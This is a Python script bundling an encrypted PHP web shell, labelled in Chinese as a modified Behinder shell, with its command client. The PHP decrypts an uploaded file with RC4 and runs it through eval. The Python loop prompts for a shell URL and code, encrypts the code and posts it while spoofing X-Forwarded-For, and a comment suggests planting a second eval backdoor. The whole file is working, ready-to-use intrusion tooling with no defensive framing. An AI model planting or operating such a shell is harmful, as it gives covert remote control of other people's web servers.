#!/usr/bin/python3
# -*- coding=utf-8 -*-

muma = '''魔改的冰蝎马
<?php
@error_reporting(0);
session_start();
$FILE_FIELD='code';
if(!isset($_FILES[$FILE_FIELD])||empty($_FILES[$FILE_FIELD]['name'])){
	return;
}
$key = $_FILES[$FILE_FIELD]['name'];
$_SESSION['k']=$key;
$post=file_get_contents($_FILES[$FILE_FIELD]['tmp_name']);
$post=encrypt($post, $key,true);
$arr=explode('|',$post,2);
$func=$arr[0];
$params=$arr[1];
class C{public function __construct($p) {eval($p."");}}
@new C($params);
function encrypt($string,$key='',$decode=false){
    $key=md5($key);
    $key_length=strlen($key);
    $string=$decode?base64_decode($string):substr(md5($string.$key),0,8).$string;
    $string_length=strlen($string);
    $rndkey=$box=array();
    $result='';
    for($i=0;$i<=255;$i++){
        $rndkey[$i]=ord($key[$i%$key_length]);
        $box[$i]=$i;
    }
    for($j=$i=0;$i<256;$i++){
        $j=($j+$box[$i]+$rndkey[$i])%256;
        $tmp=$box[$i];
        $box[$i]=$box[$j];
        $box[$j]=$tmp;
    }
    for($a=$j=$i=0;$i<$string_length;$i++){
        $a=($a+1)%256;
        $j=($j+$box[$a])%256;
        $tmp=$box[$a];
        $box[$a]=$box[$j];
        $box[$j]=$tmp;
        $result.=chr(ord($string[$i])^($box[($box[$a]+$box[$j])%256]));
    }
    if($decode){
        if(substr($result,0,8)==substr(md5(substr($result,8).$key),0,8)){
            return substr($result,8);
        }else{
            return '';
        }
    }else{
        return base64_encode($result);
    }
}
?>
'''

import requests,io
import base64
import hashlib

def bm(dm,key):
	rndkey = []
	box = []
	a = b = j = 0
	result = ''
	for x in range(0,256):
		rndkey.append(ord(key[x%len(key)]))
		box.append(x)
	for i in range(0,256):
		j = (j+box[i]+rndkey[i])%256
		tmp = box[i]
		box[i]=box[j]
		box[j]=tmp
	for c in range(0,len(dm)):
		a=(a+1)%256
		b=(b+box[a])%256;
		tmp2=box[a];
		box[a]=box[b];
		box[b]=tmp2;
		result+=chr(ord(dm[c])^(box[(box[a]+box[b])%256]))
	return result

url = input('shell地址：')
while 1:
	dm = input('请输入代码：')# phpinfo(); file_put_contents('a.php','<?php eval($_POST[a])?>');
	if dm == 'exit':
		exit()
	key = '123456'
	keymd5 = hashlib.md5(bytes(key.encode())).hexdigest()
	dm = hashlib.md5(bytes(('|'+dm+keymd5).encode())).hexdigest()[0:8] + '|' + dm
	dm = base64.b64encode(bm(dm,keymd5).encode('latin_1'))
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36","X-Forwarded-For":"127.0.0.1","Connection":"close"}
	proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
	# proxies = {}
	file = io.BytesIO(dm)
	file.name = key
	files = {'code':file}
	requests.packages.urllib3.disable_warnings()
	resp = requests.post(url,headers=headers,files=files,proxies=proxies,verify=False,timeout=60)
	print(resp.text)
